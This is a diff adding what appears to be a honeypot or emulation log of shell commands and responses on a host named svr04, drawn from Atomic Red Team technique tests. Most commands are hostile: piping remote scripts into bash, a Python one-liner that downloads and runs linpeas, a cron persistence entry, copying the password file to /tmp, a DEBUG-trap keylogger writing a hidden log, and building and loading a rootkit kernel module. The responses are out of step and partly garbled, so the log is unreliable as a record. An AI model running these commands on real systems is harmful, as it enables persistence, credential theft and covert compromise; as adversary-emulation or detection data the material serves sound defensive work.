@@ -1,0 +1,192 @@
+action:
+command:whoami
+response:[4hroot@svr04:~# whoami
+
+
+action:
+command:whoami
+response:[4hroot@svr04:~# whoami
+
+
+action:
+command:curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+response:cu
+
+action:
+command:wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+response:rl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+[4lwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:whoami
+response:[4hroot@svr04:~# whoami
+[4lroot
+[4hroot@svr04:~# 
+
+action:
+command:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
+response:echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" >> /var/spool/cron/crontabs/persistevil
+
+
+action:
+command:pip install requests
+response:pip install requests
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+
+
+action:
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+
+
+action:
+command:sudo cat /etc/master.passwd > /tmp/T1003.008.txt
+response:sudo cat /etc/master.passwd > /tmp/T1003.008.txt
+
+
+action:
+command:cat /tmp/T1003.008.txt
+response:cat /tmp/T1003.008.txt
+bash: $: command not found
+
+
+action:
+command:echo ""
+response:echo ""
+
+
+action:
+command:trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> /tmp/.keyboard.log' DEBUG
+response:trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> /tmp/.keyboard.log' DEBUG
+
+
+action:
+command:echo "Hello World!"
+response:echo "Hello World!"
+bash: trap: command not found
+Blocked command!
+[4l
+
+action:
+command:cat /tmp/.keyboard.log
+response:cat /tmp/.keyboard.log
+
+
+action:
+command:export http_proxy=127.0.0.1:8080
+response:export http_proxy=127.0.0.1:8080
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+
+
+action:
+command:whoami
+response:[4hroot@svr04:~# whoami
+
+
+action:
+command:sudo apt install make
+response:sudo apt install make
+[4l[4hroot@svr04:~# [4lmake: *** No targets specified and no makefile found.  Stop.
+[4hroot@svr04:~# 
+
+action:
+command:sudo apt install gcc
+response:sudo apt install gcc
+[4l[4hroot@svr04:~# [4lgcc: fatal error: no input files
+compilation terminated.
+[4hroot@svr04:~# 
+
+action:
+command:if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;
+response:if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;
+bash: if: command not found
+bash: then: command not found
+[4ltouch: cannot touch `/tmp/T1014/safe_to_delete`: no such file or directory
+[4hbash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cp /home/atomic/T1014/src/Linux/* /tmp/T1014
+response:c
+
+action:
+command:cd /tmp/T1014; make        
+response:p /home/atomic/T1014/src/Linux/* /tmp/T1014
+[4lcp: cannot stat `/home/atomic/T1014/src/Linux/*': No such file or directory
+[4hroot@svr04:~# 
+
+action:
+command:sudo cp /tmp/T1014/T1014.ko /lib/modules/$(uname -r)/
+response:c
+
+action:
+command:[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014
+response:d /tmp/T1014; make        
+[4lbash: cd: /tmp/T1014: No such file or directory
+[4h[4lmake: *** No targets specified and no makefile found.  Stop.
+[4hroot@svr04:~# sudo cp /tmp/T1014/T1014.ko /lib/modules/$(uname -r)/
+[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014
+bash: [: command not found
+
+
+action:
+command:sudo depmod -a
+response:sudo d
+
+action:
+command:sudo modprobe T1014
+response:epmod -a
+[4lsudo: Only one of the -e, -h, -i, -K, -l, -s, -v or -V options may be specified
+usage: sudo [-D level] -h | -K | -k | -V
+usage: sudo -v [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid]
+usage: sudo -l[l] [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-U user name] [-u user name|#uid] [-g groupname|#gid] [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] file ...
+[4hroot@svr04:~# sudo modprobe T1014
+[4lsudo: Only one of the -e, -h, -i, -K, -l, -s, -v or -V options may be specified
+usage: sudo [-D level] -h | -K | -k | -V
+usage: sudo -v [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid]
+usage: sudo -l[l] [-AknS] [-D level] [-g groupname|#gid] [-p prompt] [-U user name] [-u user name|#uid] [-g groupname|#gid] [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C fd] [-D level] [-g groupname|#gid] [-p prompt] [-u user name|#uid] file ...
+[4hroot@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
